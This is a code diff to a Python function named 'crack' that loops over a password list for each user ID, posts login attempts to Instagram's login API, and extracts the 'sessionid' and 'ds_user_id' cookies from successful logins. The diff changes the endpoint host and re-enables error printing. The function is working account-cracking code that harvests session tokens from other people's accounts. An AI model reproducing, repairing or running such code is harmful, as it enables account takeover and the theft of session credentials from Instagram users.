@@ -149,7 +149,7 @@ def crack(uid, password_list, total_count):
             'username': '8918929941',
             'jazoest': '23031',}
             # Make API request
-            response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
@@ -170,23 +170,23 @@ def crack(uid, password_list, total_count):
                 cps.append(uid)
                 continue
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
-        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
     except requests.exceptions.ConnectionError:
         time.sleep(5)
         return False
     except requests.exceptions.RequestException as e:
-        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
         print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
